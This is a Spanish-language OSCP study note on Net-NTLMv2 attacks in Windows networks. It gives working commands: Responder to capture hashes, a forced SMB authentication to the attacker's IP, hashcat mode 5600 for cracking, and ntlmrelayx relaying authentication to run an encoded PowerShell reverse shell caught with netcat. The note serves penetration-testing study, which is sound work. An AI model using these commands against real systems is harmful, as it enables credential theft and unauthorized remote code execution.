---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, explotacion, ad, password, windows]
fecha: 2026-10-05
---

# Net-NTLMv2 (Responder y Relay)

> [!abstract] Qué es y cuándo usarla
> **Net-NTLMv2** es el protocolo de autenticación **en red** de Windows (challenge-response). No sirve para Pass-the-Hash, pero si forzamos al target a autenticarse contra **nuestra** máquina podemos **capturar** el hash (y crackearlo) o **relayarlo** a otra máquina. Úsala cuando eres **usuario sin privilegios** (no puedes usar [[Mimikatz]]).

## Requisitos previos
- Forma de **forzar la autenticación** del target hacia Kali: code exec (`dir \\KALI\test`), o un input que acepte **rutas UNC** (`\\KALI\share\x.txt` en un upload, etc.).
- Interfaz de Kali conocida (`ip a`).

## A) Capturar y crackear (Responder)
```bash
sudo responder -I tap0            # levanta SMB/HTTP/... y captura Net-NTLMv2 (raw sockets -> sudo)
```
```powershell
# desde el target (bind/reverse shell): fuerza la autenticación SMB
dir \\192.168.119.2\test          # "Access is denied" da igual; ya capturó el hash
```
```bash
# guardar el hash capturado en paul.hash y crackear (NetNTLMv2 = modo 5600)
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

## B) Relay (sin crackear) — ntlmrelayx
Si el hash es muy complejo, reenviarlo a otra máquina donde el user sea **admin local**:
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <b64_revshell>"
nc -nvlp 8080                     # listener para la reverse shell
```
```powershell
# en el target: forzar la autenticación -> ntlmrelayx la reenvía a -t y ejecuta -c
dir \\192.168.119.2\test
```

| Parte | Qué hace |
|---|---|
| `responder -I <iface>` | SMB server que captura Net-NTLMv2 (+ LLMNR/NBT-NS/MDNS poisoning) |
| `hashcat -m 5600` | Crackea Net-NTLMv2 |
| `ntlmrelayx --no-http-server -smb2support -t <IP> -c <cmd>` | Relaya la auth SMB a `<IP>` y ejecuta `<cmd>` como el user relayado |

> [!warning] Detección / problemas
> - El **relay** requiere que el user relayado sea **admin local** en el destino; si no es el `Administrator` local, necesita **UAC remote restrictions off**.
> - No se puede relayar de vuelta a la **misma** máquina de origen.
> - Captura ≠ PtH: Net-NTLMv2 **no** se puede reusar como un NTLM; hay que **crackear** o **relay**.

## Visto en
- Módulo: [[16 - Password Attacks]]
- Relacionado: [[Pass-the-Hash]] · [[Mimikatz]] · [[Password Cracking (Hashcat y John)]]
- Máquinas: [[]]
